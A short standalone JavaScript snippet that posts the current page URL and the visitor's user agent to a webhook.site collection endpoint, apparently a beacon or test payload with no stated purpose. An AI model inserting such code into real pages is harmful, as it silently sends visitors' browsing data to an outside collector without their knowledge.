fetch("https://webhook.site/183eeec6-640b-4e5d-b9ff-bf1d5165adcc", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    page: window.location.href,
    userAgent: navigator.userAgent
  })
});
